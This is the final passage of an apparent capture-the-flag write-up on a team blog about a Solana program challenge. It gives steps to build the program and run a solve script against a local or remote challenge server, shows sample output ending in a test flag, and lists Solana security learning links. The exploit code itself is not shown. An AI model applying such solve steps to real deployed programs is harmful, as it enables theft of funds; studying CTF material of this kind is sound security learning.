+<ol>
+  <li>Build the program with <code class="language-plaintext highlighter-rouge">cargo build-bpf</code></li>
+  <li>Run the solve script:
+    <ul>
+      <li>run <code class="language-plaintext highlighter-rouge">python solve.py</code> to run it on a local instance of the server</li>
+      <li>run <code class="language-plaintext highlighter-rouge">python solve.py HOST=&lt;server_addr&gt; PORT=&lt;server_port&gt;</code> to run it against the real server</li>
+    </ul>
+  </li>
+</ol>
+
+<p>The output should look something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Opening connection to localhost on port 5000: Done
+[*] program: FrMQd67gsyEre7sdoY3SC6sPe3cBq3yHEkpVb9VRTxyo
+[*] user: 4CXtoTXu7QLysLSEobV5S4fFg3rV6fhgb3NV6gKbrKLG
+[*] useraccount: C1TUKbrBD2xUA3kzQCanB9uMFzEMS4AWjKGcNAqngcmy
+[*] character: Gu5KLAKoSjLNb9wFtoE8TaB5DwQoUjNgZQCNm5BMXvJ6
+[*] vault: EPpZENNT5qpowQvBDGmvZkPAyCKu4zx3PUwneybkGw1e
+[+] Receiving all data: Done (55B)
+[*] Closed connection to localhost port 5000
+[*]
+    lamports: 49997
+    your did it!
+    Flag: SEKAI{test_flag}
+</code></pre></div></div>
+
+<h2 id="to-learn-more-abount-solana">To learn more abount solana</h2>
+
+<ul>
+  <li><a href="https://solanacookbook.com">solana cookbook</a> - Essential concepts</li>
+  <li><a href="https://docs.rs/solana-sdk/latest/solana_sdk/">solana sdk for rust</a></li>
+  <li><a href="https://docs.solana.com/developers">Developement docs</a></li>
+  <li><a href="https://workshop.neodyme.io/index.html">neodyme workshop</a> - A security workshop to start learning different types of issues</li>
+</ul>
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+			</div>
+
+	<nav class="
+     
+    flex flex-wrap  mx-auto w-full max-w-2xl md:px-0 px-4 text-white text-lg mb-6 
+    "
+>
+    <span class="text-green-500">fibonhack@templeos</span>
+    <p>:</p>
+    <span class="text-blue-400">~/GFT</span>
+    <p>$</p>
+    <form id="command_form" class="flex ml-1 relative">
+        <input id="command" type="text" spellcheck="false" class="w-full bg-transparent focus:outline-0 border-none">
+    </form>
+</nav>
+
+<footer class="
+     
+    text-white space-x-4 justify-end sw-full py-12 px-6 border-t border-dashed border-1 border-zinc-600 flex items-center
+    "
+>
+    
+    <a class="text-zinc-600 hover:text-zinc-100" href="https://github.com/fibonhack">
+        <svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+    <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" />
+</svg>
+    </a>
+
+    <a class="text-zinc-600 hover:text-blue-400" href="https://twitter.com/fibonhack">
+        <svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+    <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
+</svg>
+        
+    </a>
+
+    <a class="saturate-0 contrast-[.75] brightness-[.75] hover:brightness-100 hover:contrast-100 hover:saturate-[.40]" href="https://ctftime.org/team/117538">
+        <svg class="w-auto h-8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 283.46 79.33" style="enable-background:new 0 0 283.46 79.33;" xml:space="preserve">
+	<style type="text/css">
+		.st0{fill:#E3000B;}
+		.st1{fill:#FFFFFF;}
+	</style>
+	<g id="Layer_1">
+		<polygon class="st0" points="0,79.52 154.36,79.52 283.46,79.52 283.46,0.19 0,0.19 33.23,40.29  "/>
+		<polygon class="st1" points="61.92,57.92 80.47,57.92 80.47,51.68 74.06,51.68 74.06,51.68 69.3,51.68 69.3,27.9 74.06,27.9    74.06,27.9 80.47,27.9 80.47,21.02 61.92,21.02  "/>
+		<polygon class="st1" points="86.32,28.11 91.6,28.11 91.6,57.92 98.98,57.92 98.98,28.11 104.25,28.11 104.25,21.02 86.32,21.02     "/>
+		<polygon class="st1" points="110.3,57.63 117.69,57.63 117.69,42.88 126.9,42.88 126.9,37.15 117.69,37.15 117.69,27.9    129.02,27.9 129.02,21.02 110.3,20.73  "/>
+		<polygon class="st1" points="182.79,25.34 188.33,25.34 188.33,57.92 192.76,57.92 192.76,25.34 198.29,25.34 198.29,21.02    182.79,21.02  "/>
+		<rect x="203.31" y="21.02" class="st1" width="4.43" height="36.9"/>
+		<polygon class="st1" points="224.16,34.52 218.89,21.02 214.52,21.02 214.52,57.92 218.89,57.92 218.89,31.78 224.16,45.06    229.43,31.78 229.43,57.92 233.81,57.92 233.81,21.02 229.43,21.02  "/>
+		<polygon class="st1" points="244.77,53.6 244.77,41.58 252.15,41.58 252.15,37.26 244.77,37.26 244.77,25.34 256.88,25.34    258.04,21.02 240.34,21.02 240.34,57.92 257.85,57.92 256.69,53.6  "/>
+		<path class="st1" d="M135.54,21.02v36.9h39.7v-36.9H135.54z M169.83,52.89h-28.87V26.05h28.87V52.89z"/>
+		<polygon class="st1" points="153.91,39.38 147.8,45.48 151.83,49.05 161.24,39.65 145.16,23.57 138.1,23.57  "/>
+	</g>
+</svg>
+    </a>
+</footer>
+
+	</body>
+</html>
